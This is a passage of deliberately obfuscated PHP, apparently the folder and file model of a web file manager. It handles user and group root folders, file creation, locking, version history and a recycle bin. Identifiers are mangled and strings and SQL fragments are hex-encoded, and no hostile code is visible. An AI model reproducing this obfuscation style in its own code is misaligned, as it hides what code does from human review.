array($ÈÃûĞ—‘[$¤æƒë÷ú[88]], $™óÒƒÖš, $¤æƒë÷ú[2410]); } else { $ÈÃûĞ—‘[$¤æƒë÷ú[88]] = $™óÒƒÖš; } } if (isset($–×ş¶©Ú[$¤æƒë÷ú[2402]]) && $–×ş¶©Ú[$¤æƒë÷ú[2402]] > 0) { $ÈÃûĞ—‘[$¤æƒë÷ú[79]] = array($¤æƒë÷ú[2408], $–×ş¶©Ú[$¤æƒë÷ú[2402]]); } if (isset($–×ş¶©Ú[$¤æƒë÷ú[2403]]) && $–×ş¶©Ú[$¤æƒë÷ú[2403]]) { $™óÒƒÖš = array($¤æƒë÷ú[2409], $–×ş¶©Ú[$¤æƒë÷ú[2403]]); if ($ÈÃûĞ—‘[$¤æƒë÷ú[79]]) { $ÈÃûĞ—‘[$¤æƒë÷ú[79]] = array($ÈÃûĞ—‘[$¤æƒë÷ú[79]], $™óÒƒÖš, $¤æƒë÷ú[2410]); } else { $ÈÃûĞ—‘[$¤æƒë÷ú[79]] = $™óÒƒÖš; } } if (isset($–×ş¶©Ú[$¤æƒë÷ú[681]]) && $–×ş¶©Ú[$¤æƒë÷ú[681]]) { $ÈÃûĞ—‘[] = array($¤æƒë÷ú[539] => $–×ş¶©Ú[$¤æƒë÷ú[681]], $¤æƒë÷ú[537] => $–×ş¶©Ú[$¤æƒë÷ú[681]], $¤æƒë÷ú[1112] => $¤æƒë÷ú[2231]); } if (isset($–×ş¶©Ú[$¤æƒë÷ú[497]]) && $–×ş¶©Ú[$¤æƒë÷ú[497]]) { $åÉôæ¿ = $–×ş¶©Ú[$¤æƒë÷ú[497]]; if ($åÉôæ¿ == $¤æƒë÷ú[78]) { $ÈÃûĞ—‘[$¤æƒë÷ú[496]] = 1; } else { if ($åÉôæ¿ == $¤æƒë÷ú[2411]) { $ÈÃûĞ—‘[$¤æƒë÷ú[496]] = 0; } else { if ($åÉôæ¿) { $åÉôæ¿ = is_array($åÉôæ¿) ? $åÉôæ¿ : explode($¤æƒë÷ú[50], $åÉôæ¿); $ÈÃûĞ—‘[$¤æƒë÷ú[497]] = array($¤æƒë÷ú[503], $åÉôæ¿); $ÈÃûĞ—‘[$¤æƒë÷ú[496]] = 0; } } } } $this->_parseSearchParent($–×ş¶©Ú, $ÈÃûĞ—‘); if (isset($–×ş¶©Ú[$¤æƒë÷ú[2227]]) && trim($–×ş¶©Ú[$¤æƒë÷ú[2227]])) { $·¤şßÎ· = trim($–×ş¶©Ú[$¤æƒë÷ú[2227]]); $œÉÎö¹¿ = explode($¤æƒë÷ú[53], $·¤şßÎ·); if (strlen($·¤şßÎ·) > 2 && (substr($·¤şßÎ·, 0, 1) == $¤æƒë÷ú[119] && substr($·¤şßÎ·, -1) == $¤æƒë÷ú[119]) || substr($·¤şßÎ·, 0, 1) == $¤æƒë÷ú[58] && substr($·¤şßÎ·, -1) == $¤æƒë÷ú[58]) { $·¤şßÎ· = substr($·¤şßÎ·, 1, -1); $œÉÎö¹¿ = array($·¤şßÎ·); } $ÈÃûĞ—‘[$¤æƒë÷ú[32]] = array(array($¤æƒë÷ú[631], $¤æƒë÷ú[2229] . $·¤şßÎ· . $¤æƒë÷ú[2229])); if (count($œÉÎö¹¿) > 1) { $ÈÃûĞ—‘[$¤æƒë÷ú[32]] = array(); foreach ($œÉÎö¹¿ as $¶Ò§ƒ®Ö) { if (!trim($¶Ò§ƒ®Ö)) { continue; } $ÈÃûĞ—‘[$¤æƒë÷ú[32]][] = array($¤æƒë÷ú[631], $¤æƒë÷ú[2229] . trim($¶Ò§ƒ®Ö) . $¤æƒë÷ú[2229]); } } } return $ÈÃûĞ—‘; } private function _parseSearchParent($¨Åš‚‚¨, &$šÚÖƒ—Ê) { $Çü¾äˆ› =& $_SERVER[öæÛ¿©¿]; if (!isset($¨Åš‚‚¨[$Çü¾äˆ›[191]]) || !$¨Åš‚‚¨[$Çü¾äˆ›[191]]) { return; } $ïí£µ€ = $this->pathInfo($¨Åš‚‚¨[$Çü¾äˆ›[191]]); $©Î¨¸¬· = $ïí£µ€[$Çü¾äˆ›[191]] . $Çü¾äˆ›[12] === $Çü¾äˆ›[229]; $‘æïçÜÀ = $ïí£µ€[$Çü¾äˆ›[189]] == $Çü¾äˆ›[594]; if ($ïí£µ€[$Çü¾äˆ›[610]] == $Çü¾äˆ›[611]) { $áÛ¨€ˆÎ = $this->sourceInfo($¨Åš‚‚¨[$Çü¾äˆ›[191]]); $ïí£µ€[$Çü¾äˆ›[600]] = $áÛ¨€ˆÎ[$Çü¾äˆ›[600]]; } $šÚÖƒ—Ê[$Çü¾äˆ›[671]] = array($Çü¾äˆ›[631], $ïí£µ€[$Çü¾äˆ›[600]] . $¨Åš‚‚¨[$Çü¾äˆ›[191]] . $Çü¾äˆ›[632]); $»€ôÜ = isset($¨Åš‚‚¨[$Çü¾äˆ›[2093]]) && in_array($Çü¾äˆ›[594], $¨Åš‚‚¨[$Çü¾äˆ›[2093]]); if (!$»€ôÜ || !$‘æïçÜÀ || !$©Î¨¸¬· || !$ïí£µ€[$Çü¾äˆ›[498]]) { return; } if (!AuthModel::authCheckRoot($ïí£µ€[$Çü¾äˆ›[498]][$Çü¾äˆ›[499]])) { return; } $½İÙ€ùÁ = $ïí£µ€[$Çü¾äˆ›[585]] . $Çü¾äˆ›[12]; if ($½İÙ€ùÁ == $Çü¾äˆ›[91]) { unset($šÚÖƒ—Ê[$Çü¾äˆ›[671]]); $šÚÖƒ—Ê[$Çü¾äˆ›[189]] = self::TYPE_GROUP; return; } $·¹Àà¢ = Model($Çü¾äˆ›[601])->groupChildrenAll($½İÙ€ùÁ); $è™Ôö¡¹ = count($·¹Àà¢); if ($è™Ôö¡¹ <= 1) { return; } $Ï¥øì™í = array($Çü¾äˆ›[191] => 0, $Çü¾äˆ›[189] => self::TYPE_GROUP, $Çü¾äˆ›[585] => array($Çü¾äˆ›[7], $·¹Àà¢)); $½¥ûü¯  = $this->field($Çü¾äˆ›[2412])->where($Ï¥øì™í)->limit($è™Ôö¡¹)->select(); $šÚÖƒ—Ê[$Çü¾äˆ›[671]] = array(); foreach ($½¥ûü¯  as $ñà—¹£ï) { $šÚÖƒ—Ê[$Çü¾äˆ›[671]][] = array($Çü¾äˆ›[631], $Çü¾äˆ›[609] . $ñà—¹£ï[$Çü¾äˆ›[192]] . $Çü¾äˆ›[632]); } $šÚÖƒ—Ê[$Çü¾äˆ›[671]][] = $Çü¾äˆ›[2231]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($½Ó˜ºÏ) { $œÛö²Í‘ =& $_SERVER[öæÛ¿©¿]; $şÙ¬åü = Model($œÛö²Í‘[593])->where(array($œÛö²Í‘[1916] => $½Ó˜ºÏ))->find(); $ÎÏàıŸ÷ = $this->_mkdirRoot(SourceModel::TYPE_USER, $½Ó˜ºÏ, $şÙ¬åü[$œÛö²Í‘[32]]); $this->userDesktopAdd($ÎÏàıŸ÷); return $ÎÏàıŸ÷; } public function userDesktopAdd($ÉêêŒ¨ß) { $¼«›íü =& $_SERVER[öæÛ¿©¿]; $«¹éùŒ· = LNG($¼«›íü[2413]); $¸Çª•ƒ = $this->mkdir($ÉêêŒ¨ß, $«¹éùŒ·); $this->metaSet($¸Çª•ƒ, $¼«›íü[2414], $¼«›íü[91]); $this->metaSet($ÉêêŒ¨ß, $¼«›íü[2415], $¸Çª•ƒ); } public function userPathSafeAdd($ù–û¹¡Ö) { $ˆ÷ıÖÈı =& $_SERVER[öæÛ¿©¿]; $Ü°Œ¯ñ = Model($ˆ÷ıÖÈı[593])->getInfoFull($ù–û¹¡Ö); if (!$Ü°Œ¯ñ) { return !1; } if (_get($Ü°Œ¯ñ, $ˆ÷ıÖÈı[614])) { return $Ü°Œ¯ñ[$ˆ÷ıÖÈı[551]][$ˆ÷ıÖÈı[2416]]; } $ö¦ğê§£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ù–û¹¡Ö, $ˆ÷ıÖÈı[2417], $ˆ÷ıÖÈı[2418]); Model($ˆ÷ıÖÈı[593])->metaSet($ù–û¹¡Ö, $ˆ÷ıÖÈı[2416], $ö¦ğê§£); $this->metaSet($ö¦ğê§£, $ˆ÷ıÖÈı[2419], $ù–û¹¡Ö); return $ö¦ğê§£; } public function userPathAppAdd($ûäåŒòÆ, $Ä«¥ñä¨ = '', $Ê©í‰¾Á = '') { $ìÏâ­¢ =& $_SERVER[öæÛ¿©¿]; $±¶ØîÀÂ = Model($ìÏâ­¢[593])->getInfoFull($ûäåŒòÆ); if (!$±¶ØîÀÂ) { return !1; } $Â¤÷åÆˆ = $±¶ØîÀÂ[$ìÏâ­¢[551]] ? $±¶ØîÀÂ[$ìÏâ­¢[551]] : array(); $±ãŠÚ¼ = $Â¤÷åÆˆ[$ìÏâ­¢[2420]]; if (!$±ãŠÚ¼) { $±ãŠÚ¼ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ûäåŒòÆ, $ìÏâ­¢[2421], $ìÏâ­¢[2422]); Model($ìÏâ­¢[593])->metaSet($ûäåŒòÆ, $ìÏâ­¢[2420], $±ãŠÚ¼ . $ìÏâ­¢[12]); $this->metaSet($±ãŠÚ¼, $ìÏâ­¢[2420], $ûäåŒòÆ); } if (!$Ä«¥ñä¨) { return $±ãŠÚ¼; } $Şİ´±İ¥ = $Â¤÷åÆˆ[$ìÏâ­¢[2423] . $Ä«¥ñä¨]; if (!$Şİ´±İ¥) { $Şİ´±İ¥ = $this->mkdir($±ãŠÚ¼, $Ä«¥ñä¨); Model($ìÏâ­¢[593])->metaSet($ûäåŒòÆ, $ìÏâ­¢[2423] . $Ä«¥ñä¨, $Şİ´±İ¥); $this->metaSet($Şİ´±İ¥, $ìÏâ­¢[2423] . $Ä«¥ñä¨, $ûäåŒòÆ); } if (!$Ê©í‰¾Á) { return $Şİ´±İ¥; } $Ô„¤Ë‘œ = $this->mkdir($Şİ´±İ¥, $Ê©í‰¾Á); return $Ô„¤Ë‘œ; } public function groupRootAdd($¢Ò£ˆãø) { $™Š€é‹Ã =& $_SERVER[öæÛ¿©¿]; $²£‰ÕÄ¸ = Model($™Š€é‹Ã[601])->where(array($™Š€é‹Ã[2216] => $¢Ò£ˆãø))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¢Ò£ˆãø, $²£‰ÕÄ¸[$™Š€é‹Ã[32]]); } public function systemRootPathAdd($Œîêò¯³) { if ($Œîêò¯³ != $_SERVER[öæÛ¿©¿][624]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Œîêò¯³); } public function userRootRemove($»¼àáä) { $ÔÜ©Ë¶Ê = $this->targetSourceRoot(SourceModel::TYPE_USER, $»¼àáä, !0); foreach ($ÔÜ©Ë¶Ê as $ãøÊû…è) { if (!$ãøÊû…è) { continue; } $this->remove($ãøÊû…è[$_SERVER[öæÛ¿©¿][192]], !1); } } public function groupRootRemove($ªÕíÌŸŞ) { $›Îß˜ù‰ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ªÕíÌŸŞ); if (!$›Îß˜ù‰) { return; } $this->remove($›Îß˜ù‰[$_SERVER[öæÛ¿©¿][192]], !1); } private function _mkdirRoot($ïĞù‰Òö, $¿×¬ùı, $ŠÅ ‡ş, $è’÷öüú = '') { $Õ–º¿¹ =& $_SERVER[öæÛ¿©¿]; $…’ú½Ã€ = KodUser::id(); $Ÿî£™¿ô = array($Õ–º¿¹[488] => 0, $Õ–º¿¹[667] => $ïĞù‰Òö, $Õ–º¿¹[668] => $¿×¬ùı, $Õ–º¿¹[665] => 1, $Õ–º¿¹[669] => $…’ú½Ã€, $Õ–º¿¹[670] => $…’ú½Ã€, $Õ–º¿¹[666] => $è’÷öüú, $Õ–º¿¹[671] => $Õ–º¿¹[609], $Õ–º¿¹[515] => 0, $Õ–º¿¹[636] => 0, $Õ–º¿¹[554] => 0, $Õ–º¿¹[672] => $Õ–º¿¹[12]); if ($“ÒµÈœ = $this->where($Ÿî£™¿ô)->find()) { return $“ÒµÈœ[$Õ–º¿¹[192]]; } $¡±öãá§ = "\x4d\157\144\145\154\123\x6f\x75\162\143\x65\56\x6d\153\x64\151\162\122\157\157\164\x2e{$ïĞù‰Òö}\56{$¿×¬ùı}\56" . $ŠÅ ‡ş; CacheLock::lock($¡±öãá§); $Ÿî£™¿ô[$Õ–º¿¹[32]] = $ŠÅ ‡ş; $ú¿è—¬ = $this->add($Ÿî£™¿ô); $ÊÏè¦Ç° = array($Õ–º¿¹[673] => short_id($ú¿è—¬)); $this->where(array($Õ–º¿¹[502] => $ú¿è—¬))->save($ÊÏè¦Ç°); CacheLock::unlock($¡±öãá§); return $ú¿è—¬; } private function targetSourceRoot($ŠÂß™ Â, $áÔùí‹×, $¶§õ¥Å¢ = false) { $Ü–ÄûÉö =& $_SERVER[öæÛ¿©¿]; $—ìÎ¸ÄÙ = array($Ü–ÄûÉö[488] => 0, $Ü–ÄûÉö[667] => $ŠÂß™ Â, $Ü–ÄûÉö[668] => $áÔùí‹×); if ($¶§õ¥Å¢) { $’†‰ÛŠÜ = $this->where($—ìÎ¸ÄÙ)->select(); return $’†‰ÛŠÜ ? $’†‰ÛŠÜ : array(); } $ÀÊ ãŸ = $this->where($—ìÎ¸ÄÙ)->find(); return $ÀÊ ãŸ ? $ÀÊ ãŸ : array(); } public function sourceRootGroup($‚ÑıÓêæ) { $¨†÷Ÿ’„ =& $_SERVER[öæÛ¿©¿]; if (is_string($‚ÑıÓêæ)) { $‚ÑıÓêæ = array($‚ÑıÓêæ); } $›öÂ“õó = $this->listSourceRoot(SourceModel::TYPE_GROUP, $‚ÑıÓêæ, $¨†÷Ÿ’„[221]); $ôÓ±üï = array($¨†÷Ÿ’„[446] => $›öÂ“õó, $¨†÷Ÿ’„[443] => array($¨†÷Ÿ’„[851] => count($‚ÑıÓêæ))); $this->_listDataApply($ôÓ±üï[$¨†÷Ÿ’„[446]]); $this->_listMake($ôÓ±üï); return array_to_keyvalue($ôÓ±üï[$¨†÷Ÿ’„[85]], $¨†÷Ÿ’„[585]); } public function mkfile($§î£Ş€‹, $¶¯ôŞ¾÷, $ä¢ˆí´ö = '', $÷ÙÙÙŞª = REPEAT_RENAME) { $ æ·Û­· =& $_SERVER[öæÛ¿©¿]; $à¶ƒ´óé = KodIO::ioFileDriverGet($ æ·Û­·[494] . $§î£Ş€‹ . $ æ·Û­·[403]); $ûŠÆıì = Model($ æ·Û­·[693])->addFileByContent($ä¢ˆí´ö, $à¶ƒ´óé, $¶¯ôŞ¾÷); return $this->_createFileCall($§î£Ş€‹, $¶¯ôŞ¾÷, $ûŠÆıì, $÷ÙÙÙŞª, $ æ·Û­·[1488]); } public function addFile($ŠÖÊãô©, $’ßóçš±, $éœñíÓ“, $äúá÷àå = false, $ÛÌéŸ¾ã = REPEAT_RENAME) { $ñ‹¼¡Ú =& $_SERVER[öæÛ¿©¿]; $Š×š‡À = KodIO::ioFileDriverGet($ñ‹¼¡Ú[494] . $ŠÖÊãô© . $ñ‹¼¡Ú[403]); $÷Â¨ŞŸœ = Model($ñ‹¼¡Ú[693])->addFile($’ßóçš±, $Š×š‡À, $éœñíÓ“, $äúá÷àå); return $this->_createFileCall($ŠÖÊãô©, $éœñíÓ“, $÷Â¨ŞŸœ, $ÛÌéŸ¾ã); } public function addFileByFileID($ŠÎíöäÈ, $¦ô§ˆÜ¶, $ŠÚŒ¼é, $ã€œé÷À = REPEAT_RENAME) { $µ¢ü•‡Ï =& $_SERVER[öæÛ¿©¿]; $µ’ÆÈõ’ = Model($µ¢ü•‡Ï[693])->find($¦ô§ˆÜ¶); Model($µ¢ü•‡Ï[693])->linkAdd($¦ô§ˆÜ¶); return $this->_createFileCall($ŠÎíöäÈ, $ŠÚŒ¼é, $µ’ÆÈõ’, $ã€œé÷À); } public function addFileByRemote($Î¥µÑÕ³, $ÍÄ€æ‰Ù, $ÄÑ²Í’ò, $¢ÒÕåœÅ = array(), $µ´éÌ× = REPEAT_RENAME) { $‡óÕôÙİ = Model($_SERVER[öæÛ¿©¿][693])->addFileByRemote($ÍÄ€æ‰Ù, $ÄÑ²Í’ò, $¢ÒÕåœÅ); return $this->_createFileCall($Î¥µÑÕ³, $ÄÑ²Í’ò, $‡óÕôÙİ, $µ´éÌ×); } private function _createFileCall($êƒÃóõ, $óÕ½¯±, $Ò·¡òîß, $¤ŒÏ¢¥ƒ, $õáô‹¥ô = "\165\160\154\x6f\141\x64") { $Ü£óïŒÊ =& $_SERVER[öæÛ¿©¿]; if (!$Ò·¡òîß) { return !1; } $ÏÉ‘òıË = !1; $this->setMasterDB(); $this->lockWriteStart($êƒÃóõ, $óÕ½¯±); $ş„Ÿ­é© = $this->fileNameExist($êƒÃóõ, $óÕ½¯±); $ööÙ÷Œ = $this->_createFile($êƒÃóõ, $óÕ½¯±, $Ò·¡òîß, $¤ŒÏ¢¥ƒ, $ÏÉ‘òıË); if (!$ÏÉ‘òıË) { Model($Ü£óïŒÊ[556])->remove($Ò·¡òîß[$Ü£óïŒÊ[553]]); } if ($ÏÉ‘òıË && $ööÙ÷Œ && $ööÙ÷Œ != $ş„Ÿ­é©) { Model($Ü£óïŒÊ[2385])->eventCreate($ööÙ÷Œ, $õáô‹¥ô); } $this->lockWriteEnd($êƒÃóõ, $óÕ½¯±); return $ööÙ÷Œ; } public function mkdir($ñÍĞÏÖˆ, $´ÈÚÃ¥ğ, $Òª¨Ïš = REPEAT_SKIP) { $êÎÁôÛ =& $_SERVER[öæÛ¿©¿]; $this->setMasterDB(); $æªŒ¥ŞÚ = $this->sourceInfo($ñÍĞÏÖˆ); if (!$æªŒ¥ŞÚ) { return !1; } $this->lockWriteStart($ñÍĞÏÖˆ, $´ÈÚÃ¥ğ); if ($Òª¨Ïš !== !1) { $±ù—Ğ‘È = $this->fileNameExist($ñÍĞÏÖˆ, $´ÈÚÃ¥ğ); if ($±ù—Ğ‘È && $Òª¨Ïš != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ñÍĞÏÖˆ, $´ÈÚÃ¥ğ); return $±ù—Ğ‘È; } $´ÈÚÃ¥ğ = $this->fileNameAuto($ñÍĞÏÖˆ, $´ÈÚÃ¥ğ, $Òª¨Ïš); } $İÃè·˜½ = array($êÎÁôÛ[665] => 1, $êÎÁôÛ[505] => $´ÈÚÃ¥ğ, $êÎÁôÛ[666] => $êÎÁôÛ[12], $êÎÁôÛ[554] => 0, $êÎÁôÛ[636] => 0); $ğû°Ù°¢ = $this->_addSource($İÃè·˜½, $æªŒ¥ŞÚ); Model($êÎÁôÛ[2385])->eventCreate($ğû°Ù°¢, $êÎÁôÛ[1489]); $this->lockWriteEnd($ñÍĞÏÖˆ, $´ÈÚÃ¥ğ); return $ğû°Ù°¢; } public function listSourceRoot($ù·ó€Ë, $‚á„‘½, $æºœ²Ÿş = "\163\x6f\165\162\x63\x65\x49\x44\54\x74\141\x72\x67\145\x74\x49\104\x2c\x73\x69\x7a\145") { $¥…±±ş =& $_SERVER[öæÛ¿©¿]; $¡çÑæÆó = $¥…±±ş[463]; $²Üü‘¼ß = array(); $ªòõÕ«† = 1024 * 50; $‹Ì¸ÏŞ» = is_array($‹Ì¸ÏŞ») ? $‹Ì¸ÏŞ» : array(); $¤îÌ»ëÀ = count($‚á„‘½); $ÃÓ§š = $this->tablePrefix . $¥…±±ş[2424]; for ($€Áƒì¹¬ = 0; $€Áƒì¹¬ < $¤îÌ»ëÀ; $€Áƒì¹¬++) { $ÔÀÉ®ı· = $‚á„‘½[$€Áƒì¹¬]; $¡çÑæÆó .= "\x53\105\114\105\x43\124\40\x2a\40\x46\x52\117\x4d\x20\x28\123\x45\x4c\105\103\x54\40{$æºœ²Ÿş}\40\x46\x52\x4f\x4d\x20\x60{$ÃÓ§š}\x60\40\x57\x48\x45\122\x45\x20"; $¡çÑæÆó .= "\140\x70\x61\x72\x65\156\164\111\104\x60\75\x30\x20\x41\x4e\x44\x20\140\164\141\x72\147\145\164\x49\x44\x60\75{$ÔÀÉ®ı·}\x20\x41\x4e\104\40\x60\x74\x61\x72\147\x65\x74\x54\171\x70\145\x60\x3d{$ù·ó€Ë}\x20\x61\156\x64\x20\x66\x69\154\145\x54\x79\x70\x65\x3d\47\47\x20\154\x69\x6d\x69\x74\x20\x31\51\x20\141\163\x20\164\x62\137{$€Áƒì¹¬}\x20\125\116\111\117\x4e\40\101\114\x4c\x20"; if ((strlen($¡çÑæÆó) >= $ªòõÕ«† || $€Áƒì¹¬ == $¤îÌ»ëÀ - 1) && $¡çÑæÆó) { $¡çÑæÆó = substr($¡çÑæÆó, 0, -strlen($¥…±±ş[1150])); $¯¹Â€ø = $this->query($¡çÑæÆó); $¡çÑæÆó = $¥…±±ş[12]; $²Üü‘¼ß = array_merge($²Üü‘¼ß, $¯¹Â€ø); } } return $²Üü‘¼ß; } private function _createFile($áïŒ¾ Ğ, $Ş½É™³‘, $Óì€¢Âı, $ú“‹Û×‚, &$¯÷»ş¢») { $óÛ´© ² =& $_SERVER[öæÛ¿©¿]; $ÏğÈ·ãõ = $this->sourceInfo($áïŒ¾ Ğ); if (!$Óì€¢Âı || !$ÏğÈ·ãõ) { return !1; } if ($ú“‹Û×‚ !== !1) { $É¾Ö¾îœ = $this->fileNameExist($áïŒ¾ Ğ, $Ş½É™³‘); } $¯÷»ş¢» = !0; if ($ú“‹Û×‚ && $É¾Ö¾îœ) { if ($ú“‹Û×‚ == REPEAT_SKIP) { $¯÷»ş¢» = !1; return $É¾Ö¾îœ; } else { if ($ú“‹Û×‚ == REPEAT_REPLACE) { $’“ü‰’ = $this->sourceInfo($É¾Ö¾îœ); $ı£ì¡ã = $this->fileHistory($’“ü‰’, $Óì€¢Âı[$óÛ´© ²[553]], $Óì€¢Âı[$óÛ´© ²[79]]); if (!$ı£ì¡ã) { $¯÷»ş¢» = !1; } else { $this->folderSizeReset($áïŒ¾ Ğ); } return $É¾Ö¾îœ; } else { $Ş½É™³‘ = $this->fileNameAuto($áïŒ¾ Ğ, $Ş½É™³‘, $ú“‹Û×‚, !1); } } } $‚ùÁÅ±« = array($óÛ´© ²[665] => 0, $óÛ´© ²[505] => $Ş½É™³‘, $óÛ´© ²[666] => substr(get_path_ext($Ş½É™³‘), 0, 10), $óÛ´© ²[554] => $Óì€¢Âı[$óÛ´© ²[553]], $óÛ´© ²[636] => $Óì€¢Âı[$óÛ´© ²[79]]); $Ë‚ëíÑÂ = $this->_addSource($‚ùÁÅ±«, $ÏğÈ·ãõ); $this->folderSizeReset($áïŒ¾ Ğ, intval($‚ùÁÅ±«[$óÛ´© ²[79]])); return $Ë‚ëíÑÂ; } protected function fileHistory($ìŒä—ï, $©öÒÂò, $Á•Äø±) { $şÌâıÎµ =& $_SERVER[öæÛ¿©¿]; if ($ìŒä—ï[$şÌâıÎµ[553]] == $©öÒÂò) { return !1; } $this->checkLock($ìŒä—ï[$şÌâıÎµ[192]], $©öÒÂò); Model($şÌâıÎµ[2425])->addHistory($ìŒä—ï); $¬Æ¼¦™¯ = array($şÌâıÎµ[670] => USER_ID, $şÌâıÎµ[509] => time(), $şÌâıÎµ[553] => $©öÒÂò, $şÌâıÎµ[79] => $Á•Äø±); $this->where(array($şÌâıÎµ[502] => $ìŒä—ï[$şÌâıÎµ[192]]))->save($¬Æ¼¦™¯); $this->sourceCacheClear($ìŒä—ï[$şÌâıÎµ[192]]); return !0; } public function checkLock($¶ê¦®¤¬, $ÂØ©•Ç) { $šü¹—ùæ =& $_SERVER[öæÛ¿©¿]; $ÁúŠ©¯´ = $this->pathInfo($¶ê¦®¤¬); if (!$this->fileIsLock($ÁúŠ©¯´, !0)) { return; } $ô¡ËŞ©Â = Session::get($šü¹—ùæ[2426]); $ÙÜîÍÉ— = substr($ÁúŠ©¯´[$šü¹—ùæ[32]], 0, -1 - strlen($ÁúŠ©¯´[$šü¹—ùæ[167]])) . $šü¹—ùæ[1341] . $ô¡ËŞ©Â . $šü¹—ùæ[10] . $ÁúŠ©¯´[$šü¹—ùæ[167]]; $È£ô·Ù€ = Model($šü¹—ùæ[693])->find($ÂØ©•Ç); $this->_createFileCall($ÁúŠ©¯´[$šü¹—ùæ[191]], $ÙÜîÍÉ—, $È£ô·Ù€, REPEAT_REPLACE, $šü¹—ùæ[1488]); $ŒøÄº´ = $ÁúŠ©¯´[$šü¹—ùæ[551]][$šü¹—ùæ[629]]; $š¡ÚÜ±Å = $ŒøÄº´[$šü¹—ùæ[2427]] ? $ŒøÄº´[$šü¹—ùæ[2427]] : $ŒøÄº´[$šü¹—ùæ[32]]; show_json(LNG($šü¹—ùæ[2428]) . $šü¹—ùæ[2429] . LNG($šü¹—ùæ[2430]) . $šü¹—ùæ[2431] . $š¡ÚÜ±Å . $šü¹—ùæ[2432], !1); } public function fileIsLock($ÊøÑ¨•, $… ©‘âª = false) { $ìÚ®õÕ =& $_SERVER[öæÛ¿©¿]; if (!_get($ÊøÑ¨•, $ìÚ®õÕ[625], 0)) { return !1; } if ($ÊøÑ¨•[$ìÚ®õÕ[551]][$ìÚ®õÕ[628]] != USER_ID) { return !0; } $š›„®´† = $GLOBALS[$ìÚ®õÕ[6]][$ìÚ®õÕ[92]][$ìÚ®õÕ[626]]; if ($ÊøÑ¨•[$ìÚ®õÕ[551]][$ìÚ®õÕ[627]] <= time() - $š›„®´†) { $this->metaSet($ÊøÑ¨•[$ìÚ®õÕ[192]], $ìÚ®õÕ[628], null); $this->metaSet($ÊøÑ¨•[$ìÚ®õÕ[192]], $ìÚ®õÕ[627], null); } if ($… ©‘âª) { $this->metaSet($ÊøÑ¨•[$ìÚ®õÕ[192]], $ìÚ®õÕ[627], time()); } return !1; } private function _addSource($³ËÉ‚¦å, $©ëŒŒê) { $§»è—µ =& $_SERVER[öæÛ¿©¿]; $Ò­¼á¶ò = KodUser::id(); $ìĞ›şğ‡ = array($§»è—µ[667] => $©ëŒŒê[$§»è—µ[189]], $§»è—µ[668] => $©ëŒŒê[$§»è—µ[585]], $§»è—µ[669] => $Ò­¼á¶ò, $§»è—µ[670] => $Ò­¼á¶ò, $§»è—µ[488] => $©ëŒŒê[$§»è—µ[192]], $§»è—µ[671] => $©ëŒŒê[$§»è—µ[600]] . $©ëŒŒê[$§»è—µ[192]] . $§»è—µ[50], $§»è—µ[515] => 0, $§»è—µ[672] => $§»è—µ[12]); $³ËÉ‚¦å = array_merge($ìĞ›şğ‡, $³ËÉ‚¦å); $this->updateModifyTime($³ËÉ‚¦å[$§»è—µ[191]]); $ÃÍÒØ¹ = $§»è—µ[2433] . $©ëŒŒê[$§»è—µ[192]]; if (isset(self::$cacheChildList[$ÃÍÒØ¹])) { unset(self::$cacheChildList[$ÃÍÒØ¹]); } static $¤Ä®éŸ = false; if (!$¤Ä®éŸ) { Hook::trigger($§»è—µ[655], $³ËÉ‚¦å); $¤Ä®éŸ = !0; } $‚ôê­ó = $this->add($³ËÉ‚¦å); $Î¼¾ªŞ = array($§»è—µ[673] => short_id($‚ôê­ó)); $this->where(array($§»è—µ[502] => $‚ôê­ó))->save($Î¼¾ªŞ); $this->setNamePinyin($‚ôê­ó, $³ËÉ‚¦å[$§»è—µ[32]]); return $‚ôê­ó; } public function remove($ı¡ŠŠ·ô, $Ñù¶Ç¼ = true) { $Ñò¢Şù¾ =& $_SERVER[öæÛ¿©¿]; $Œë¤·º = $this->sourceInfo($ı¡ŠŠ·ô); $ù©¾ŞœÀ = intval($Œë¤·º[$Ñò¢Şù¾[189]]) === self::TYPE_SYSTEM; $‘ÊëíÁ = Model($Ñò¢Şù¾[518])->get($Ñò¢Şù¾[2434]) == $Ñò¢Şù¾[91]; if ($ù©¾ŞœÀ || $Ñù¶Ç¼ || !$‘ÊëíÁ) { return $this->removeNow($ı¡ŠŠ·ô, $Ñù¶Ç¼); } $¡ğ£¦¤‘ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ú¹è§ç = $Œë¤·º[$Ñò¢Şù¾[189]] == self::TYPE_USER ? $Ñò¢Şù¾[681] : $Ñò¢Şù¾[594]; if ($Ú¹è§ç == $Ñò¢Şù¾[681]) { $º…ãïƒ¢ = Model($Ñò¢Şù¾[593])->getInfo($Œë¤·º[$Ñò¢Şù¾[585]]); $·´†ÓÙ” = !empty($º…ãïƒ¢[$Ñò¢Şù¾[2427]]) ? $º…ãïƒ¢[$Ñò¢Şù¾[2427]] : $º…ãïƒ¢[$Ñò¢Şù¾[32]]; $·´†ÓÙ” = $Ñò¢Şù¾[338] . $·´†ÓÙ” . $Ñò¢Şù¾[2435] . $Œë¤·º[$Ñò¢Şù¾[585]]; } else { $º…ãïƒ¢ = Model($Ñò¢Şù¾[601])->getInfo($Œë¤·º[$Ñò¢Şù¾[585]]); $·´†ÓÙ” = _get($º…ãïƒ¢, $Ñò¢Şù¾[32]); $·´†ÓÙ” = $Ñò¢Şù¾[174] . $·´†ÓÙ” . $Ñò¢Şù¾[2436] . $Œë¤·º[$Ñò¢Şù¾[585]]; } $ò½êæ’Ğ = $Ñò¢Şù¾[2437] . md5($·´†ÓÙ”); CacheLock::lock($ò½êæ’Ğ); $¦·¦˜€¦ = $this->fileNameExist($¡ğ£¦¤‘, $·´†ÓÙ”); if (!$¦·¦˜€¦) { $¦·¦˜€¦ = $this->mkdir($¡ğ£¦¤‘, $·´†ÓÙ”, REPEAT_SKIP); $this->metaSet($¦·¦˜€¦, $Ñò¢Şù¾[2438], $Ú¹è§ç); $this->metaSet($¦·¦˜€¦, $Ñò¢Şù¾[2439], $Œë¤·º[$Ñò¢Şù¾[585]]); if ($Œë¤·º[$Ñò¢Şù¾[191]] != 0) { $this->metaSet($¦·¦˜€¦, $Ñò¢Şù¾[2440], 